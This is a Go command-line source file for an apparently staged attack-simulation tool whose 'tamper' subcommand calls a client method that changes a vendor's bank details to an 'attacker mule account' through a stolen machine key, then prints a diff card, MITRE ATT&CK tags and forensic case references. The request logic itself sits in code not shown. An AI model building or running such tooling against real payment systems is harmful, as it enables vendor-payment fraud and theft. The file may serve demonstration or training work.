package cmd

import (
	"encoding/json"
	"fmt"

	"github.com/spf13/cobra"
	"harborstrike-x/attack-cli/pkg/utils"
)

var (
	targetVendorID string
	fraudAccount   string
	bankRouting    string
)

var tamperCmd = &cobra.Command{
	Use:   "tamper",
	Short: "Phase 6: Silent Fraudulent Vendor Bank Account Tampering",
	Long: `Phase 6: Silent Fraudulent Vendor Bank Account Tampering
Executes the critical fraud payload: PATCH /api/v2/vendors/{id}/bank-details via machine key key-tb-07
from rogue host 10.20.4.77, silently altering the disbursement routing to an attacker mule account.`,
	Run: func(cmd *cobra.Command, args []string) {
		utils.PrintBreadcrumb("HARBORSTRIKE-X", "PHASE 6", "SILENT FRAUDULENT BANK TAMPERING [CLIMAX]")
		utils.PrintHeader("Phase 6: Silent Vendor Bank Account Tampering")
		cli := GetClient()

		purple := utils.ColorElectricPurple + utils.ColorBold
		pink := utils.ColorNeonPink + utils.ColorBold
		green := utils.ColorEmeraldMint + utils.ColorBold
		red := utils.ColorCrimson + utils.ColorBold
		yellow := utils.ColorAmberGold + utils.ColorBold
		white := utils.ColorPureWhite + utils.ColorBold
		reset := utils.ColorReset

		utils.PrintInfo("Target Vendor   : %s (Coastal Packaging Ltd)", targetVendorID)
		utils.PrintInfo("Fraud Account   : %s (Attacker-Controlled Mule Route)", fraudAccount)
		utils.PrintInfo("Bank Routing    : %s (HDFC Harbour Branch IFSC)", bankRouting)
		utils.PrintInfo("Origin Ingress  : 10.20.4.77 (tb-build-02 Rogue Host on Private Link)")
		fmt.Println()

		data, err := cli.TamperVendorBank(targetVendorID, fraudAccount, bankRouting)
		if err != nil {
			utils.PrintError("Bank tampering failed: %v", err)
			return
		}

		utils.PrintSuccess("EXPLOIT EXECUTED: Vendor disbursement destination altered to mule account!")

		// Linux-style clean diff card
		oldAcc := "****4417"
		newAcc := "****9083"
		vendorTitle := fmt.Sprintf("%v - %v", data["vendor_id"], data["vendor_name"])
		modifiedBy := "Machine key (redacted) from 10.20.4.77"
		approvalRef := "BLANK / NULL (Zero Dual-Approval Enforced!)"

		utils.DrawDiffCard(vendorTitle, oldAcc, newAcc, modifiedBy, approvalRef)

		// Forensic Correlation & Next Phase
		evidenceLines := []string{
			fmt.Sprintf(" Case Evidence : %sE18 (req-5f61b0de8 on 03 Sep), E19 (chg-8b9888c39b with blank approval)%s", white, reset),
			fmt.Sprintf(" MITRE ATT&CK  : %sT1565.001 (Stored Data Manipulation) │ T1078 (Valid Accounts)%s", pink, reset),
			fmt.Sprintf(" Financial Risk: %sINR 248,000 scheduled for disbursement on September 8, 2026 (Invoice INV-9081)%s", red, reset),
		}
		utils.DrawBox("🔍 FORENSIC EVIDENCE & MITRE ATT&CK CORRELATION", evidenceLines, purple, 80)

		fmt.Printf("  %s▶ NEXT STEP:%s Run %s%shso verify-run%s to verify the fraudulent payout is locked in.\n\n",
			yellow, reset, green, utils.ColorUnderline, reset)

		if verbose {
			fmt.Println("  Raw Change Record:")
			safeData := make(map[string]interface{}, len(data))
			for key, value := range data {
				if key != "modified_by" {
					safeData[key] = value
				}
			}
			formatted, _ := json.MarshalIndent(safeData, "  ", "  ")
			fmt.Println(string(formatted))
		}
	},
}

func init() {
	tamperCmd.Flags().StringVar(&targetVendorID, "vendor", "V-0412", "Target vendor ID")
	tamperCmd.Flags().StringVar(&fraudAccount, "account", "HDFC0001842-9083", "Fraudulent recipient bank account")
	tamperCmd.Flags().StringVar(&bankRouting, "routing", "HDFC0001842", "Bank IFSC / routing coordinate")
	rootCmd.AddCommand(tamperCmd)
}
